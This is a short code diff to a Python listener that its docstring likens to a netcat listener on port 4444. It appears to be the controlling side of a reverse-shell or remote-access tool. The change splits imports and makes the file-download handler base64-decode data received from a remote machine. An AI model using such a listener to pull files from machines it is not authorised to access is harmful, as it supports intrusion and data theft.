@@ -5,7 +5,9 @@ It acts as linux command such as "nc -vv -l -p 4444"
 """
 import socket
 import optparse
-import socket, json
+import socket
+import json
+import base64
 
 def get_arguments():
     # Get command line arguments
@@ -101,7 +103,7 @@ class Listener:
         :rtype: str
         """
         with open(path, "wb") as file:
-            file.write(content)
+            file.write(base64.b64decode(content))
             return "[+] Download successful."
 
     def run(self):
